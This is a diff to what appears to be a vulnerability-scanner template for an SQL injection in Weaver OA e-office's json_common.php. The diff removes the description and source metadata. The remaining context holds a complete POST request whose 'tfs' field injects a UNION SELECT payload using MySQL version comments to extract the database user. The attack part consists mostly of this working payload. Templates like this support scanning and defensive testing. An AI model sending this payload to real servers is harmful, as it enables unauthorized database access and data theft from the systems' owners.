@@ -3,12 +3,8 @@ info:
   name: 泛微 OA e-office json_common.php SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gnxkfkarg23n5lcu'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gnxkfkarg23n5lcu
-    fofa: 暂无
 http:
 - raw:
   - 'POST /building/json_common.php HTTP/1.1
@@ -36,8 +32,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,user() ,4#|2|333
